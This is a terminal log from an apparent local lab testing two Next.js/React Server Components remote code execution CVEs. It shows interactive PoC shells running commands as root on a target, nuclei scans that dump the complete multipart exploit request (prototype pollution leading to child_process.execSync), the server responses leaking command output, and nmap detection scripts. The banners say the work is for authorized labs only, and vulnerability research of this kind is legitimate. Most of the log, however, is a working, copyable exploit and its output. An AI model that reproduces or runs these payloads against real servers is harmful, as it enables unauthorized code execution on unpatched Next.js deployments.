[launcher.Browser]2025/12/07 06:29:43 Progress: 25%
[launcher.Browser]2025/12/07 06:29:44 Progress: 45%
[launcher.Browser]2025/12/07 06:29:45 Progress: 85%
[launcher.Browser]2025/12/07 06:29:45 Downloaded: /home/hx/.cache/rod/browser/chromium-1321438
URL                                           Status       Next.js Version    Vulnerability  
-----------------------------------------------------------------------------------------------
http://127.0.0.1:3001                         200          16.0.6             Vulnerable ⚠️

(venv) hx@orz:~/1207/next_rsc_two_cves_lab/CVE-2025-55182-msanft$ python poc_shell.py

$$\                                               
$$ |                                              
$$$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\ 
$$  __$$\ \$$\ $$  |$$  __$$\ $$  __$$\ \____$$  |
$$ |  $$ | \$$$$  / $$ /  $$ |$$ |  \__|  $$$$ _/ 
$$ |  $$ | $$  $$<  $$ |  $$ |$$ |       $$  _/   
$$ |  $$ |$$  /\$$\ \$$$$$$  |$$ |      $$$$$$$$\ 
\__|  \__|\__/  \__| \______/ \__|      \________|
                                                  
                                                  
                                                  

        hxorz :: RSC Interactive RCE Shell
        CVE-2025-55182 / CVE-2025-66478

仅限你自己的靶机 / 授权测试环境使用

请输入目标 IP 或 IP:端口（例如 10.211.55.65 或 10.211.55.65:3000）: 10.211.55.65
[*] 目标地址已设为: http://10.211.55.65:3000

rsc-shell> id
[+] HTTP 500
>>> 命令输出：
uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)
rsc-shell> ls
[+] HTTP 500
>>> 命令输出：
node_modules
package.json
public
rsc-shell> whoami
[+] HTTP 500
>>> 命令输出：
nextjs
rsc-shell> uname -a
[+] HTTP 500
>>> 命令输出：
Linux 883d7b9c2784 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 Linux
rsc-shell>

(venv) hx@orz:~/1207/next_rsc_two_cves_lab/Next.js-RSC-RCE-Scanner-CVE-2025-66478$ python3 nextjs_66478_shell.py

$$\                                               
$$ |                                              
$$$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\ 
$$  __$$\ \$$\ $$  |$$  __$$\ $$  __$$\ \____$$  |
$$ |  $$ | \$$$$  / $$ /  $$ |$$ |  \__|  $$$$ _/ 
$$ |  $$ | $$  $$<  $$ |  $$ |$$ |       $$  _/   
$$ |  $$ |$$  /\$$\ \$$$$$$  |$$ |      $$$$$$$$\ 
\__|  \__|\__/  \__| \______/ \__|      \________|

        hxorz :: Next.js RSC Interactive RCE Shell
        CVE-2025-66478 (authorized lab only)

提示：仅限你自己的靶机 / 授权实验环境使用。

请输入 Next.js 目标 IP 或 IP:端口（默认 127.0.0.1:3001）: 10.211.55.65
[*] 目标地址已设为: http://10.211.55.65:3001

nextjs-rsc> ls
[+] HTTP 500
>>> 命令输出：
Dockerfile
README.md
eslint.config.mjs
next-env.d.ts
next.config.ts
node_modules
package-lock.json
package.json
postcss.config.mjs
public
src
tsconfig.json
nextjs-rsc> whoami
[+] HTTP 500
>>> 命令输出：
root
nextjs-rsc> id
[+] HTTP 500
>>> 命令输出：
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
nextjs-rsc>

(venv) hx@orz:~/1207$ vim install_nuclei.sh
(venv) hx@orz:~/1207$ chmod +x install_nuclei.sh 
(venv) hx@orz:~/1207$ ./install_nuclei.sh 
============================================
[*] Official Nuclei Installer (Proxy Ready)
============================================
[*] Version: v3.6.0
[*] Download URL:
    https://github.com/projectdiscovery/nuclei/releases/download/v3.6.0/nuclei_3.6.0_linux_amd64.zip
[*] Working directory: /tmp/nuclei-install

[*] Downloading nuclei from official GitHub...
--2025-12-07 07:41:46--  https://github.com/projectdiscovery/nuclei/releases/download/v3.6.0/nuclei_3.6.0_linux_amd64.zip
Connecting to 10.80.36.177:7890... connected.
Proxy request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/252813491/08235f23-dcba-4308-8c62-cd72a5e8bf71?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-12-07T08%3A24%3A24Z&rscd=attachment%3B+filename%3Dnuclei_3.6.0_linux_amd64.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-12-07T07%3A23%3A55Z&ske=2025-12-07T08%3A24%3A24Z&sks=b&skv=2018-11-09&sig=wRhwh4ydxhnTlYYG6bmJ0nBReVSBfLpZMz%2BuLH30aGc%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2NTA5NTEwNiwibmJmIjoxNzY1MDkzMzA2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.dcTucP-rrf_iea3yXl11SC6p5BRwe6UFIVKfAjea1Z0&response-content-disposition=attachment%3B%20filename%3Dnuclei_3.6.0_linux_amd64.zip&response-content-type=application%2Foctet-stream [following]
--2025-12-07 07:41:47--  https://release-assets.githubusercontent.com/github-production-release-asset/252813491/08235f23-dcba-4308-8c62-cd72a5e8bf71?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-12-07T08%3A24%3A24Z&rscd=attachment%3B+filename%3Dnuclei_3.6.0_linux_amd64.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-12-07T07%3A23%3A55Z&ske=2025-12-07T08%3A24%3A24Z&sks=b&skv=2018-11-09&sig=wRhwh4ydxhnTlYYG6bmJ0nBReVSBfLpZMz%2BuLH30aGc%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2NTA5NTEwNiwibmJmIjoxNzY1MDkzMzA2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.dcTucP-rrf_iea3yXl11SC6p5BRwe6UFIVKfAjea1Z0&response-content-disposition=attachment%3B%20filename%3Dnuclei_3.6.0_linux_amd64.zip&response-content-type=application%2Foctet-stream
Connecting to 10.80.36.177:7890... connected.
Proxy request sent, awaiting response... 200 OK
Length: 40394771 (39M) [application/octet-stream]
Saving to: ‘nuclei_3.6.0_linux_amd64.zip’

nuclei_3.6.0_linux_amd64.zip  100%[===============================================>]  38.52M  4.77MB/s    in 8.9s    

2025-12-07 07:41:57 (4.35 MB/s) - ‘nuclei_3.6.0_linux_amd64.zip’ saved [40394771/40394771]

[+] Download success!
[*] Installing unzip...
Hit:1 https://mirrors.ustc.edu.cn/ubuntu focal InRelease
Hit:2 https://mirrors.ustc.edu.cn/ubuntu focal-updates InRelease                                                     
Hit:3 https://mirrors.ustc.edu.cn/ubuntu focal-backports InRelease                                                   
Hit:4 https://mirrors.ustc.edu.cn/ubuntu focal-security InRelease                                                    
Hit:5 https://download.docker.com/linux/ubuntu focal InRelease                                                       
Hit:6 https://dl.google.com/linux/chrome/deb stable InRelease                                                        
Hit:7 https://aquasecurity.github.io/trivy-repo/deb focal InRelease
Reading package lists... Done
Building dependency tree       
Reading state information... Done
77 packages can be upgraded. Run 'apt list --upgradable' to see them.
Reading package lists... Done
Building dependency tree       
Reading state information... Done
unzip is already the newest version (6.0-25ubuntu1.2).
The following packages were automatically installed and are no longer required:
  python3-cached-property python3-docker python3-dockerpty python3-docopt python3-texttable python3-websocket
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 77 not upgraded.
[*] Unzipping nuclei...
Archive:  nuclei_3.6.0_linux_amd64.zip
  inflating: LICENSE.md              
  inflating: README.md               
  inflating: README_CN.md            
  inflating: README_ES.md            
  inflating: README_ID.md            
  inflating: README_JP.md            
  inflating: README_KR.md            
  inflating: README_PT-BR.md         
  inflating: nuclei                  
[*] Installing nuclei to /usr/local/bin/nuclei ...
[*] Verifying installation...
[INF] Nuclei Engine Version: v3.6.0
[INF] Nuclei Config Directory: /home/hx/.config/nuclei
[INF] Nuclei Cache Directory: /home/hx/.cache/nuclei
[INF] PDCP Directory: /home/hx/.pdcp

[+] nuclei installation completed successfully!
[+] Binary path: /usr/local/bin/nuclei
[+] Version info:
[INF] Nuclei Engine Version: v3.6.0
[INF] Nuclei Config Directory: /home/hx/.config/nuclei
[INF] Nuclei Cache Directory: /home/hx/.cache/nuclei
[INF] PDCP Directory: /home/hx/.pdcp
============================================

(venv) hx@orz:~/1207$ nuclei -u http://127.0.0.1:3001 \
>   -t /home/hx/nuclei-templates/custom/nextjs-cve-2025-66478-rce-3001.yaml \
>   -severity high -debug

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [nextjs-cve-2025-66478-rce-3001] Dumped HTTP request for http://127.0.0.1:3001

POST / HTTP/1.1
Host: 127.0.0.1:3001
User-Agent: nuclei-rsc-rce-check
Content-Length: 654
Accept: */*
Accept-Language: en
Connection: close
Content-Type: multipart/form-data; boundary=----hxorzboundary
Next-Action: x
X-Nextjs-Html-Request-Id: hxorz
X-Nextjs-Request-Id: hxorz
Accept-Encoding: gzip

------hxorzboundary
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{timeout:5000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------hxorzboundary
Content-Disposition: form-data; name="1"

"$@0"
------hxorzboundary
Content-Disposition: form-data; name="2"

[]
------hxorzboundary--
[DBG] [nextjs-cve-2025-66478-rce-3001] Dumped HTTP response http://127.0.0.1:3001

HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-store, must-revalidate
Content-Type: text/x-component
Date: Sun, 07 Dec 2025 08:24:24 GMT
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding

:N1765095864062.5676
0:{"a":"$@1","f":"","b":"development"}
1:D{"time":0.6225900000426918}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server","owner":null}
[nextjs-cve-2025-66478-rce-3001:regex-1] [http] [high] http://127.0.0.1:3001 ["uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"]
[INF] Scan completed in 317.354604ms. 1 matches found.

(venv) hx@orz:~/1207$ vim /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-body-id.yaml
(venv) hx@orz:~/1207$ nuclei -u http://127.0.0.1:3000 \
>   -t /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-body-id.yaml \
>   -severity high -debug

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [react2shell-cve-2025-55182-rce-body-id] Dumped HTTP request for http://127.0.0.1:3000/

POST / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Content-Length: 742
Accept: */*
Accept-Encoding: gzip
Accept-Language: en
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
X-Nextjs-Request-Id: b5dce965

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
[DBG] [react2shell-cve-2025-55182-rce-body-id] Dumped HTTP response http://127.0.0.1:3000/

HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Content-Encoding: gzip
Content-Type: text/x-component
Date: Sun, 07 Dec 2025 08:34:43 GMT
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
X-Nextjs-Cache: HIT
X-Nextjs-Prerender: 1

0:{"a":"$@1","f":"","b":"5941Ebq06FSt7qrd9rfm6"}
1:E{"digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"}
[react2shell-cve-2025-55182-rce-body-id:status-1] [http] [high] http://127.0.0.1:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[react2shell-cve-2025-55182-rce-body-id:word-2] [http] [high] http://127.0.0.1:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[react2shell-cve-2025-55182-rce-body-id:regex-3] [http] [high] http://127.0.0.1:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[INF] Scan completed in 80.407203ms. 3 matches found.

(venv) hx@orz:~/1207$ vim /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-safe-check.yaml
(venv) hx@orz:~/1207$ nuclei -u http://127.0.0.1:3000   -t /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-safe-check.yaml   -severity high -debug

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [react2shell-cve-2025-55182-rce-safe-check] Dumped HTTP request for http://127.0.0.1:3000/

POST / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 735
Accept: */*
Accept-Language: en
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
Accept-Encoding: gzip

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var out=process.mainModule.require('child_process').execSync('id',{'timeout':3000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:out});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
[DBG] [react2shell-cve-2025-55182-rce-safe-check] Dumped HTTP response http://127.0.0.1:3000/

HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Content-Type: text/x-component
Date: Sun, 07 Dec 2025 08:36:49 GMT
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
X-Nextjs-Cache: HIT
X-Nextjs-Prerender: 1

0:{"a":"$@1","f":"","b":"5941Ebq06FSt7qrd9rfm6"}
1:E{"digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"}
[react2shell-cve-2025-55182-rce-safe-check:status-1] [http] [high] http://127.0.0.1:3000/ ["uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"]
[react2shell-cve-2025-55182-rce-safe-check:word-2] [http] [high] http://127.0.0.1:3000/ ["uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"]
[react2shell-cve-2025-55182-rce-safe-check:regex-3] [http] [high] http://127.0.0.1:3000/ ["uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"]
[INF] Scan completed in 14.37345ms. 3 matches found.

(venv) hx@orz:~/1207$ nuclei \
>   -u http://10.211.55.65:3001 \
>   -u http://10.211.55.65:3000 \
>   -t ~/nuclei-templates/custom/nextjs-cve-2025-66478-rce-3001.yaml \
>   -t ~/nuclei-templates/custom/react2shell-cve-2025-55182-rce-body-id.yaml \
>   -severity high

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 2
[WRN] Loading 2 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 2
[react2shell-cve-2025-55182-rce-body-id:rce-id-output] [http] [high] http://10.211.55.65:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[react2shell-cve-2025-55182-rce-body-id:rce-id-output] [http] [high] http://10.211.55.65:3001/ [""digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)""]
[nextjs-cve-2025-66478-rce-3001] [http] [high] http://10.211.55.65:3001 ["uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"]
[INF] Scan completed in 582.257106ms. 3 matches found.
(venv) hx@orz:~/1207$

(venv) hx@orz:~/1207/next_rsc_two_cves_lab$ ls
CVE-2025-55182-msanft                   docker-compose.yml  nextjs-rsc-cve-2025-66478-detect.nse
Next.js-RSC-RCE-Scanner-CVE-2025-66478  nextjs-66478        react2shell-cve-2025-55182-detect.nse
React2Shell-src                         nextjs-rce-scanner  urls.txt
(venv) hx@orz:~/1207/next_rsc_two_cves_lab$ nmap -p 3000,3001 --script react2shell-cve-2025-55182-detect.nse,nextjs-rsc-cve-2025-66478-detect.nse 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-07 09:16 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000069s latency).

PORT     STATE SERVICE
3000/tcp open  ppp
| react2shell-cve-2025-55182-detect: VULNERABLE: React2Shell-style RSC digest behavior detected (CVE-2025-55182).
| HTTP status: 500
| Content-Type: text/x-component
| Observed digest: 1917316682
| NOTE: This confirms RSC digest exposure. In a real environment,
|_      exploitability should be further validated with controlled PoCs.
3001/tcp open  nessus
| nextjs-rsc-cve-2025-66478-detect: VULNERABLE: Next.js RSC digest behavior detected (CVE-2025-66478-style).
| HTTP status: 500
| Content-Type: text/x-component
| Observed digest: 3420135227
| NOTE: This confirms RSC digest exposure. In real deployments,
|_      further PoC validation may convert this into code execution.

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
(venv) hx@orz:~/1207/next_rsc_two_cves_lab$  
```
